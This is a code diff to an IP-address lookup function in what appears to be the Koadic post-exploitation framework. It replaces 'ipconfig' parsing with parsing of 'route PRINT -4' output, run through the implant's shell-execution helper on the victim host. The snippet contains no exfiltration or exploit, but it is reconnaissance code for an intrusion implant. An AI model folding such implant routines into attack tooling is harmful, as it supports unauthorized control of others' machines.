@@ -269,23 +269,62 @@ Koadic.user.IPAddrs = function()
 
 Koadic.user.IPAddrs = function()
 {
+    // try
+    // {
+    //     var ipconfig = Koadic.shell.exec("ipconfig", "%TEMP%\\"+Koadic.uuid()+".txt");
+    //     var ip = ipconfig.split("  IPv4 ")[1].split(": ")[1].split("\r\n")[0];
+    //     return ip;
+    // }
+    // catch(e)
+    // {
+    //     try
+    //     {
+    //         var ip = ipconfig.split("  IP ")[1].split(": ")[1].split("\r\n")[0];
+    //         return ip;
+    //     }
+    //     // we might need to add more conditions :/
+    //     catch(e)
+    //     {}
+    // }
+
     try
     {
-        var ipconfig = Koadic.shell.exec("ipconfig", "%TEMP%\\"+Koadic.uuid()+".txt");
-        var ip = ipconfig.split("  IPv4 ")[1].split(": ")[1].split("\r\n")[0];
-        return ip;
+        var routeprint4 = Koadic.shell.exec("route PRINT -4", "%TEMP%\\"+Koadic.uuid()+".txt");
+        var res = routeprint4.split("\r\n");
+        for (var i=0; i < res.length; i++)
+        {
+            line = res[i].split(" ");
+            // count how many 0.0.0.0 entries in this array
+            zerocount = 0;
+            // count how many entries in this array aren't empty
+            itemcount = 0;
+            // flag for when this is the line we're looking for
+            correctflag = false;
+            for (var j=0; j < line.length; j++)
+            {
+                // empty string evals to false
+                if (line[j])
+                {
+                    itemcount += 1;
+                    // ip addr is in the 4th column
+                    if (itemcount == 4 && correctflag) {
+                        return line[j];
+                    }
+                }
+                if (line[j] == "0.0.0.0")
+                {
+                    zerocount += 1;
+                    // 2 occurances of the 'any' interface in a single line is what we're looking for
+                    if (zerocount == 2)
+                    {
+                        correctflag = true;
+                    }
+                }
+            }
+        }
     }
     catch(e)
-    {
-        try
-        {
-            var ip = ipconfig.split("  IP ")[1].split(": ")[1].split("\r\n")[0];
-            return ip;
-        }
-        // we might need to add more conditions :/
-        catch(e)
-        {}
-    }
+    {}
 
     return "";
 }
